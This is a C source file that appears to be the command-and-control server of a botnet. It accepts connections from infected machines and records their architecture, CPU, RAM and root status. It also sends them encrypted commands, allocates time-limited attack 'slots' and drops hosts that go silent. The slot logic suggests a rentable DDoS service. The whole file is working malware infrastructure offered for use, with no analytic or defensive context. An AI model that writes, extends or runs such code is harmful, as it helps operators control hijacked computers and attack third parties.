#define _GNU_SOURCE

#include "../headers/botnet.h"
#include "../headers/cipher.h"
#include "../headers/theme_loader.h"
#include "../headers/users.h"
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>

Bot bots[MAX_BOTS];
int bot_count = 0;
Slot slots[MAX_SLOTS];
int slot_count = 0;
int next_slot_id = 1;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t slot_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;

int g_botport = 0;
int g_cncport = 0;

static void bot_ip(const Bot *b, char *out, size_t n) {
    if (!inet_ntop(AF_INET, &b->addr.sin_addr, out, (socklen_t)n)) {
        strncpy(out, "?", n - 1);
        out[n - 1] = '\0';
    }
}

static void bot_ram_str(const Bot *b, char *out, size_t n) {
    if (b->ram_mb >= 1024) {
        snprintf(out, n, "%.1fG", (double)b->ram_mb / 1024.0);
    } else {
        snprintf(out, n, "%ldM", b->ram_mb);
    }
}

/* screen: themed join/leave lines. logs.txt stays colorless. */
void log_join(const Bot *b) {
    char ip[32] = {0}, ram[16] = {0}, ts[32] = {0};
    bot_ip(b, ip, sizeof(ip));
    bot_ram_str(b, ram, sizeof(ram));
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    if (t) strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", t);
    pthread_mutex_lock(&log_mutex);
    FILE *f = fopen("database/logs.txt", "a");
    if (f) {
        fprintf(f, "[%s] [%s] bot joined: %s %s %s %d\n",
                ts, ip, b->arch, b->group, ram, b->cpus);
        fclose(f);
    }
    char tagged[512];
    snprintf(tagged, sizeof(tagged),
             "{GREEN}[+] {WHITE}%s | Arch: {RED}%.31s {WHITE}| {WHITE}GROUP: {RED}%.63s "
             "{WHITE}| RAM: {RED}%s {WHITE}| CPUs: {RED}%d{RESET}",
             ip, b->arch, b->group, ram, b->cpus);
    char *out = process_string_colors(tagged);
    printf("%s\n", out ? out : tagged);
    if (out) free_theme_string(out);
    fflush(stdout);
    pthread_mutex_unlock(&log_mutex);
}

void log_leave(const Bot *b) {
    char ip[32] = {0}, ram[16] = {0}, ts[32] = {0};
    bot_ip(b, ip, sizeof(ip));
    bot_ram_str(b, ram, sizeof(ram));
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    if (t) strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", t);
    pthread_mutex_lock(&log_mutex);
    FILE *f = fopen("database/logs.txt", "a");
    if (f) {
        fprintf(f, "[%s] [%s] bot left: %s %s %s %d\n",
                ts, ip, b->arch, b->group, ram, b->cpus);
        fclose(f);
    }
    char tagged[512];
    snprintf(tagged, sizeof(tagged),
             "{RED}[-] {WHITE}%s | Arch: {RED}%.31s {WHITE}| {WHITE}GROUP: {RED}%.63s "
             "{WHITE}| RAM: {RED}%s {WHITE}| CPUs: {RED}%d{RESET}",
             ip, b->arch, b->group, ram, b->cpus);
    char *out = process_string_colors(tagged);
    printf("%s\n", out ? out : tagged);
    if (out) free_theme_string(out);
    fflush(stdout);
    pthread_mutex_unlock(&log_mutex);
}

int send_line(int sock, const char *s) {
    size_t len = strlen(s);
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(sock, s + sent, len - sent, MSG_NOSIGNAL);
        if (n <= 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        sent += (size_t)n;
    }
    return 0;
}

/* CNC -> bot traffic is ChaCha20 framed; user terminal stays plaintext. */
int send_cmd(int sock, const char *s) {
    return send_encrypted_command(sock, (const uint8_t *)s, strlen(s));
}

int bot_valid_count(void) {
    int n = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].valid) n++;
    }
    pthread_mutex_unlock(&bot_mutex);
    return n;
}

void bot_counts(int *total, int *freeb, int *busyb) {
    int t = 0, f = 0, b = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].valid) continue;
        t++;
        if (bots[i].busy) b++;
        else f++;
    }
    pthread_mutex_unlock(&bot_mutex);
    if (total) *total = t;
    if (freeb) *freeb = f;
    if (busyb) *busyb = b;
}

/* expire slots AND free their bots (bots self-stop by duration, but their
   busy flags live here - without this every bot stays busy forever). */
void slot_reap(void) {
    time_t now = time(NULL);
    static int expired[MAX_SLOTS];
    int nexp = 0;
    pthread_mutex_lock(&slot_mutex);
    for (int i = 0; i < slot_count && nexp < MAX_SLOTS; i++) {
        if (slots[i].active && now >= slots[i].end) {
            slots[i].active = 0;
            expired[nexp++] = slots[i].id;
        }
    }
    pthread_mutex_unlock(&slot_mutex);
    if (nexp == 0) return;

    static int fds[MAX_BOTS];
    int n = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count && n < MAX_BOTS; i++) {
        if (!bots[i].valid) continue;
        for (int e = 0; e < nexp; e++) {
            if (bots[i].slot_id == expired[e]) {
                bots[i].busy = 0;
                bots[i].slot_id = -1;
                if (bots[i].sock > 0) fds[n++] = bots[i].sock;
                break;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    for (int i = 0; i < n; i++) send_cmd(fds[i], "stop\n");
}

int slot_active_count(void) {
    int n = 0;
    pthread_mutex_lock(&slot_mutex);
    for (int i = 0; i < slot_count; i++) {
        if (slots[i].active) n++;
    }
    pthread_mutex_unlock(&slot_mutex);
    return n;
}

/* GlobalSlots from options/settings.txt. 0 = unlimited. default 10. */
int global_slots(void) {
    static int cached = 10;
    static time_t last = 0;
    time_t now = time(NULL);
    if (now - last < 10) return cached;
    last = now;
    FILE *f = fopen("options/settings.txt", "r");
    if (!f) return cached;
    char line[128];
    while (fgets(line, sizeof(line), f)) {
        int v = 0;
        if (sscanf(line, "GlobalSlots: %d", &v) == 1) {
            if (v < 0) v = 0;
            cached = v;
            break;
        }
    }
    fclose(f);
    return cached;
}

/* UsersCanViewBots from options/settings.txt. default no (admin only). */
int users_can_view_bots(void) {
    static int cached = 0;
    static int have = 0;
    static time_t last = 0;
    time_t now = time(NULL);
    if (have && now - last < 10) return cached;
    last = now;
    FILE *f = fopen("options/settings.txt", "r");
    if (!f) return cached;
    char line[128];
    while (fgets(line, sizeof(line), f)) {
        char v[16] = {0};
        if (sscanf(line, "UsersCanViewBots: %15s", v) == 1) {
            cached = (strcasecmp(v, "yes") == 0 || strcmp(v, "1") == 0);
            have = 1;
            break;
        }
    }
    fclose(f);
    return cached;
}

void *slot_reaper(void *arg) {
    (void)arg;
    while (1) {
        sleep(1);
        slot_reap();
    }
    return NULL;
}

static void bot_invalidate(int idx) {
    if (bots[idx].sock > 0) {
        struct linger l = {1, 0};
        setsockopt(bots[idx].sock, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(bots[idx].sock);
        bots[idx].sock = -1;
    }
    bots[idx].valid = 0;
    bots[idx].busy = 0;
    bots[idx].slot_id = -1;
}

/* one thread per bot: consumes pongs, reaps dead sockets */
static void *bot_worker(void *arg) {
    int idx = *(int *)arg;
    free(arg);
    char buf[1024];
    size_t used = 0;
    while (1) {
        ssize_t n = recv(bots[idx].sock, buf + used, sizeof(buf) - used - 1, 0);
        if (n <= 0) break;
        used += (size_t)n;
        buf[used] = '\0';
        char *line = buf;
        char *nl;
        while ((nl = strchr(line, '\n')) != NULL) {
            *nl = '\0';
            if (strncmp(line, "pong", 4) == 0) {
                pthread_mutex_lock(&bot_mutex);
                bots[idx].last_seen = time(NULL);
                pthread_mutex_unlock(&bot_mutex);
            }
            line = nl + 1;
        }
        size_t left = used - (size_t)(line - buf);
        memmove(buf, line, left);
        used = left;
        if (used >= sizeof(buf) - 1) used = 0;
    }
    pthread_mutex_lock(&bot_mutex);
    Bot snap;
    int was_valid = 0;
    if (bots[idx].valid) {
        snap = bots[idx];
        was_valid = 1;
    }
    bot_invalidate(idx);
    pthread_mutex_unlock(&bot_mutex);
    if (was_valid) log_leave(&snap);
    return NULL;
}

static void spawn_bot_worker(int idx) {
    int *p = malloc(sizeof(int));
    if (!p) return;
    *p = idx;
    pthread_attr_t at;
    pthread_attr_init(&at);
    pthread_attr_setstacksize(&at, 256 * 1024);
    pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
    pthread_t t;
    if (pthread_create(&t, &at, bot_worker, p) != 0) free(p);
    pthread_attr_destroy(&at);
}

/* register hello "HELLO <arch> <group> [<cpus> <ram_mb> <disk_mb> <rooted>]".
   dupe IP -> replace old entry. */
static void bot_register(int sock, struct sockaddr_in addr) {
    char line[256] = {0};
    size_t used = 0;
    time_t end = time(NULL) + 5;
    while (time(NULL) < end) {
        ssize_t n = recv(sock, line + used, sizeof(line) - used - 1, 0);
        if (n <= 0) { close(sock); return; }
        used += (size_t)n;
        line[used] = '\0';
        if (strchr(line, '\n')) break;
        if (used >= sizeof(line) - 1) { close(sock); return; }
    }
    char arch[32] = {0}, group[64] = {0};
    int cpus = 0;
    long ram_mb = 0, disk_mb = 0;
    int rooted = 0;
    int nf = sscanf(line, "HELLO %31s %63s %d %ld %ld %d", arch, group, &cpus, &ram_mb, &disk_mb, &rooted);
    if (nf != 6) {
        if (sscanf(line, "HELLO %31s %63s", arch, group) != 2) {
            close(sock);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int idx = -1;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].valid && bots[i].addr.sin_addr.s_addr == addr.sin_addr.s_addr) {
            idx = i;
            break;
        }
    }
    if (idx >= 0) {
        bot_invalidate(idx);
    } else if (bot_count < MAX_BOTS) {
        idx = bot_count++;
    } else {
        pthread_mutex_unlock(&bot_mutex);
        close(sock);
        return;
    }
    bots[idx].sock = sock;
    bots[idx].addr = addr;
    bots[idx].valid = 1;
    strncpy(bots[idx].arch, arch, 31);
    strncpy(bots[idx].group, group, 63);
    bots[idx].busy = 0;
    bots[idx].slot_id = -1;
    bots[idx].last_seen = time(NULL);
    bots[idx].cpus = cpus;
    bots[idx].ram_mb = ram_mb;
    bots[idx].disk_mb = disk_mb;
    bots[idx].rooted = rooted ? 1 : 0;
    Bot snap = bots[idx];
    pthread_mutex_unlock(&bot_mutex);
    log_join(&snap);
    spawn_bot_worker(idx);
}

struct bot_auth_arg {
    int sock;
    struct sockaddr_in addr;
};

static void *bot_auth_thread(void *arg) {
    struct bot_auth_arg *a = arg;
    bot_register(a->sock, a->addr);
    free(a);
    return NULL;
}

void *bot_listener(void *arg) {
    (void)arg;
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port = htons((uint16_t)g_botport);
    if (bind(ls, (struct sockaddr *)&a, sizeof(a)) < 0) { perror("bot bind"); _exit(1); }
    if (listen(ls, 4096) < 0) { perror("bot listen"); _exit(1); }
    while (1) {
        struct sockaddr_in c;
        socklen_t cl = sizeof(c);
        int s = accept(ls, (struct sockaddr *)&c, &cl);
        if (s < 0) continue;
        struct bot_auth_arg *aa = malloc(sizeof(*aa));
        if (!aa) { close(s); continue; }
        aa->sock = s;
        aa->addr = c;
        pthread_attr_t at;
        pthread_attr_init(&at);
        pthread_attr_setstacksize(&at, 256 * 1024);
        pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
        pthread_t t;
        if (pthread_create(&t, &at, bot_auth_thread, aa) != 0) {
            close(s);
            free(aa);
        }
        pthread_attr_destroy(&at);
    }
    return NULL;
}

void *ping_thread(void *arg) {
    (void)arg;
    while (1) {
        sleep(10);
        /* spread pings: snapshot fds, send outside lock */
        static int fds[MAX_BOTS];
        int n = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count && n < MAX_BOTS; i++) {
            if (bots[i].valid && bots[i].sock > 0) fds[n++] = bots[i].sock;
        }
        pthread_mutex_unlock(&bot_mutex);
        int per = (n + 9) / 10;
        if (per < 1) per = 1;
        for (int s = 0; s < n; s += per) {
            int e = s + per;
            if (e > n) e = n;
            for (int i = s; i < e; i++) send_cmd(fds[i], "ping\n");
            if (e < n) usleep(500000);
        }
        /* sweep: silent >30s or dead tcp -> drop */
        time_t now = time(NULL);
        static Bot gone[MAX_BOTS];
        int ngone = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count && ngone < MAX_BOTS; i++) {
            if (!bots[i].valid) continue;
            int dead = 0;
            if (bots[i].sock <= 0 || now - bots[i].last_seen > 30) {
                dead = 1;
            } else {
                struct tcp_info ti;
                socklen_t tl = sizeof(ti);
                if (getsockopt(bots[i].sock, IPPROTO_TCP, TCP_INFO, &ti, &tl) == 0) {
                    if (ti.tcpi_state != TCP_ESTABLISHED) dead = 1;
                } else {
                    dead = 1;
                }
            }
            if (dead) {
                gone[ngone++] = bots[i];
                bot_invalidate(i);
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        for (int i = 0; i < ngone; i++) log_leave(&gone[i]);
    }
    return NULL;
}
